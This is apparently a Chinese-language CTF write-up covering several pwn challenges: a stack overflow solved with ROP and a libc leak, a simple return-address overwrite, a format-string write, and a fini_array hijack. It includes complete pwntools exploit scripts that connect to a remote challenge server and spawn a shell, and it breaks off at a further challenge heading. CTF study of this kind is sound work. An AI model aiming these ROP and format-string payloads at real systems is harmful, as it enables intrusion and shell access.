
## 栈溢出分析

```c
int \_\_cdecl main(int argc, const char \*\*argv, const char \*\*envp)
{
char buf[1024]; // [rsp+0h] [rbp-400h] BYREF
write(1, "Welcome to RCTF\n", 0x10uLL);
fflush(\_bss\_start);
read(0, buf, 1024uLL);
echo(buf);
return 0;
}
int \_\_fastcall echo(\_\_int64 buf)
{
char input[16]; // [rsp+10h] [rbp-10h] BYREF
for ( index = 0; \*(index + buf); ++index )
input[index] = \*(index + buf); // may stack overflow
input[index] = 0;
if ( !strcmp("ROIS", input) )
{
printf("RCTF{Welcome}");
puts(" is not flag");
}
return printf("%s", input);
}
```

可以看到被调用的函数将传入的参数直接拷贝在局部变量，由于传入的参数，被调用函数的变量都在栈上，所以栈的视图大概是：

```bash
|var data abc|
|rbp|
|ret|
|argument data abc|
```

如果用传统的`rop`：

```python
payload = 'A'\*0x18+p64(pop\_rdi\_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main\_addr)
```

拷贝完栈中是这样：

```bash
0x00007fffffffd950│+0x0010: 0x4141414141414141
0x00007fffffffd958│+0x0018: 0x4141414141414141
0x00007fffffffd960│+0x0020: 0x4141414141414141 ← $rbp
0x00007fffffffd968│+0x0028: 0x00000000004008a3 → <\_\_libc\_csu\_init+99> pop rdi
0x00007fffffffd970│+0x0030: 0x4141414141414141 ← $rsi, $rdi
0x00007fffffffd978│+0x0038: 0x4141414141414141
0x00007fffffffd980│+0x0040: 0x4141414141414141
0x00007fffffffd988│+0x0048: 0x00000000004008a3 → <\_\_libc\_csu\_init+99> pop r
```

要覆盖栈，所以需要`padding`（`414141`），但正因为有`padding`，所以必须要有`gadget`帮助跳过`padding`：

```python
payload = 'A'\*0x18+p64(\_3pop\_ret)+p64(1)+p64(2)+p64(3)+p64(pop\_rdi\_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main\_addr)
```

这样拷贝后就可以正常利用了：

```bash
0x00007fffffffd940│+0x0000: 0x00000001f7dd7450 ← $rsp
0x00007fffffffd948│+0x0008: 0x00007fffffffd970 → 0x4141414141414141
0x00007fffffffd950│+0x0010: 0x4141414141414141
0x00007fffffffd958│+0x0018: 0x4141414141414141
0x00007fffffffd960│+0x0020: 0x4141414141414141 ← $rbp
0x00007fffffffd968│+0x0028: 0x000000000040089e → <\_\_libc\_csu\_init+94> pop r13
0x00007fffffffd970│+0x0030: 0x4141414141414141 ← $rsi, $rdi
0x00007fffffffd978│+0x0038: 0x4141414141414141
0x00007fffffffd980│+0x0040: 0x4141414141414141
0x00007fffffffd988│+0x0048: 0x000000000040089e → <\_\_libc\_csu\_init+94> pop r13
0x00007fffffffd990│+0x0050: 0x0000000000000001
0x00007fffffffd998│+0x0058: 0x0000000000000002
0x00007fffffffd9a0│+0x0060: 0x0000000000000003
0x00007fffffffd9a8│+0x0068: 0x00000000004008a3 → <\_\_libc\_csu\_init+99> pop rdi
0x00007fffffffd9b0│+0x0070: 0x0000000000601018 → 0x00000000004005a6 → 0xffe0e90000000068 ("h"?)
0x00007fffffffd9b8│+0x0078: 0x00000000004005a0 → <puts@plt+0> jmp QWORD PTR [rip+0x200a72] # 0x601018 <puts@got.plt>
0x00007fffffffd9c0│+0x0080: 0x00000000004007cd → <main+0> push rbp
```

`exp`如下：

```python
from pwn import \*
from LibcSearcher import LibcSearcher
se=lambda x:io.send(x)
sl=lambda x:io.sendline(x)
sa=lambda x,y:io.sendafter(x,y)
rv=lambda :io.recv()
sconnect=lambda :io.interactive()
IS\_LOCAL = 1
context.log\_level = "DEBUG"
pwn\_file = './welpwn'
elf = ELF(pwn\_file)
if IS\_LOCAL:
io = process(pwn\_file)
else:
io = remote('111.200.241.244','59488')
#---------------------------------------------------------
#0x00000000004008a3 : pop rdi ; ret
#0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret
\_3pop\_ret = 0x000000000040089e
pop\_rdi\_ret = 0x00000000004008a3
main\_addr = 0x4007CD
payload = 'A'\*0x18+p64(\_3pop\_ret)+p64(1)+p64(2)+p64(3)+p64(pop\_rdi\_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main\_addr)
#payload = 'A'\*0x18+p64(pop\_rdi\_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main\_addr)
if IS\_LOCAL:
gdb.attach(io,"break \*0x400782\nc")
pause()
sa("Welcome to RCTF\n",payload)
io.recvuntil('\x40')
puts\_addr = u64(io.recvline()[:-1].ljust(8,'\x00'))
if IS\_LOCAL:
libc = ELF('/lib/x86\_64-linux-gnu/libc.so.6')
libc\_base = puts\_addr - libc.sym['puts']
system\_addr = libc\_base + libc.sym['system']
str\_bin\_sh = libc\_base + next(libc.search('/bin/sh'))
else:
libc=LibcSearcher('puts',puts\_addr)
libc\_base = puts\_addr - libc.dump('puts')
system\_addr = libc\_base + libc.dump('system')
str\_bin\_sh = libc\_base + libc.dump('str\_bin\_sh')
log.info('puts\_addr: 0x%x'%puts\_addr)
log.info('system\_addr: 0x%x'%system\_addr)
log.info('str\_bin\_sh: 0x%x'%str\_bin\_sh)
payload2 = 'A'\*0x18+p64(\_3pop\_ret)+p64(1)+p64(2)+p64(3)+p64(pop\_rdi\_ret)+p64(str\_bin\_sh)+p64(system\_addr)
if IS\_LOCAL:
sa("Welcome to RCTF\n",payload2)
else:
se(payload2)
sconnect()
```

## 反应釜开关控制

简单题目：

```python
from pwn import \*
from LibcSearcher import LibcSearcher
se=lambda x:io.send(x)
sl=lambda x:io.sendline(x)
sa=lambda x,y:io.sendafter(x,y)
rv=lambda :io.recv()
sconnect=lambda :io.interactive()
IS\_LOCAL = 0
context.log\_level = "DEBUG"
pwn\_file = './aaa'
elf = ELF(pwn\_file)
if IS\_LOCAL:
io = process(pwn\_file)
else:
io = remote('111.200.241.244','58023')
#---------------------------------------------------------
payload = 'A'\*0x208+p64(0x4005F6)
rv()
sl(payload)
sconnect()
```

## 实时数据监测

简单的字符串格式化漏洞，先`gdb`调试出`offset`是12，然后直接用工具自动生成`payload`：

```python
from pwn import \*
from LibcSearcher import LibcSearcher
se=lambda x:io.send(x)
sl=lambda x:io.sendline(x)
sa=lambda x,y:io.sendafter(x,y)
rv=lambda :io.recv()
sconnect=lambda :io.interactive()
IS\_LOCAL = 0
context.log\_level = "DEBUG"
pwn\_file = './data\_monitor'
elf = ELF(pwn\_file)
if IS\_LOCAL:
io = process(pwn\_file)
else:
io = remote('111.200.241.244','50322')
#---------------------------------------------------------
offest = 12
target\_addr = 0x804A048
value = 0x2223322
payload = fmtstr\_payload(offest,{target\_addr:value})
'''
if IS\_LOCAL:
gdb.attach(io,"break \*0x8048824\nc")
pause()
'''
sl(payload)
sconnect()
```

## greeting-150

这个题目用到一个知识点.`fini.array`中的函数在`main`结束时被调用，所以需要修改其中的函数地址为`_start`，这样就可以完成攻击。攻击用到的`system@plt`和`_start`地址：

```
\_start: 0x080484F0
system@plt: 0x08048490
```

由于`fini.array`中原有的数据和`_start`高两位都一样，只需要修改后两位，就可以那么按照从小到大写入原则，按照如下顺序写入数据：

```
0x80F0 3
0x0804 1
0x8490 2
```

`exp`如下

```python
import sys
from pwn import \*
from LibcSearcher import LibcSearcher
rv = lambda : io.recv()
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
se = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
sconnect = lambda : io.interactive()
context.log\_level = "DEBUG"
pwn\_file = './greeting-150'
elf = ELF(pwn\_file)
if len(sys.argv) < 2:
IS\_LOCAL = 1
io = process(pwn\_file)
else:
IS\_LOCAL = 0
sys\_argv = sys.argv[1].split(':')
io = remote(sys\_argv[0], int(sys\_argv[1]))
#---------------------------------------------------------
fini\_array\_addr = 0x08049934
strlen\_got\_lo = elf.got['strlen']
strlen\_got\_hi = elf.got['strlen']+2
payload = 'aa'+p32(strlen\_got\_hi)+p32(strlen\_got\_lo)+p32(fini\_array\_addr)+"%2020c%12$hn"+"%31884c%13$hn"+"%96c%14$hn"
if IS\_LOCAL:
gdb.attach(io,"break \*0x804864F\nc")
pause()
rv()
sl(payload)
rv()
sl("/bin/sh")
sconnect()
```

补充链接：详解64位静态编译程序的fini_array劫持及ROP攻击 [<mark class="encrypted">be9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9i4K6g2p5i4K6t1^5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9</mark> "<mark class="encrypted">a0dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1j5J5x3U0j5H3x3o6y4Q4x3X3g2Z5N6r3#2D9</mark>")

## note-service2

嗯这题命中了我知识的盲点：数组索引越界。先看看保护措施：
